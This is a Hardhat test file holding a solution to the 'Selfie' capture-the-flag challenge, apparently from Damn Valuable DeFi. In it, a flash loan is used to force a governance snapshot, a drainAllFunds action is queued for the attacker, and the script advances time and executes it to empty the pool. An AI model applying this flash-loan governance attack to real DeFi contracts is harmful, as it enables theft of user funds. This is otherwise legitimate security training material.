import { ethers, network } from "hardhat";
import { expect } from "chai";


describe('[Challenge] Selfie', function () {
    this.timeout(0);
    
    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); 
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); 

    before(async function () {
        /** SETUP SCENARIO */
        
        const accounts = await ethers.getSigners();
        const [deployer, attacker, ...otherAccounts] = accounts;


        const tokenFactory = await ethers.getContractFactory("DamnValuableTokenSnapshot");
        this.token = await tokenFactory.connect(deployer).deploy(TOKEN_INITIAL_SUPPLY);

        const governanceFactory = await ethers.getContractFactory("SimpleGovernance");
        this.governance = await governanceFactory.connect(deployer).deploy(this.token.address);

        const poolFactory = await ethers.getContractFactory("SelfiePool");
        this.pool = await poolFactory.connect(deployer).deploy(this.token.address, this.governance.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.eq(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const accounts = await ethers.getSigners();
        const attacker = accounts[1];
 
        /*
        * to pass _hasEnoughVotes check, get a flashloan, force a snapshot and return the funds
        * que an action to call drainAllFunds(attacker.address). Action's receiver should be SelfiePool?  
        * wait 2 days, than execute action
        */

        const expFactory = await ethers.getContractFactory("SelfiePoolExp");
        const expCont = await expFactory.connect(attacker).deploy(this.pool.address, this.governance.address);
        
        let tx = await expCont.forceSnapshot(TOKENS_IN_POOL);
        await tx.wait();
        console.log(tx);

        tx = await expCont.queAction(attacker.address);
        await tx.wait();
        console.log(tx);
        
        // Advance time 2 days so that depositors can get rewards
        const duration = 60 * 60 * 24 * 2;
        await network.provider.send("evm_increaseTime", [duration]);

        tx = await expCont.execAction();
        await tx.wait();
        console.log(tx);
   });

    after(async function () {
        const accounts = await ethers.getSigners();
        const attacker = accounts[1];

        /** SUCCESS CONDITION */
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.eq(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.eq(0);
    });
});
